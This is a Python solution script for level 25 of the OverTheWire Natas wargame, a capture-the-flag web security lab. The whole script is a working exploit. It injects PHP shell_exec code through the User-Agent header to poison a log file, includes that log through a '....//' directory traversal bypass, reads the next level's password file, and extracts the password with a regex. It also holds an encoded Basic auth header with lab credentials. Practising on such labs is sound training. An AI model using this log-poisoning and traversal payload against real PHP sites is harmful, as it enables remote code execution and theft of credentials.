import requests
import re
from requests.auth import HTTPBasicAuth
def solve25(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw=="
    url = "http://natas25.natas.labs.overthewire.org/?lang=en"
    session.get(url)
    sessid = dict(session.cookies)["PHPSESSID"]
    session.headers["User-Agent"] = "<?php echo shell_exec('cat /etc/natas_webpass/natas26'); ?>"
    url = f"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_{sessid}.log"
    resp = session.get(url)
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw

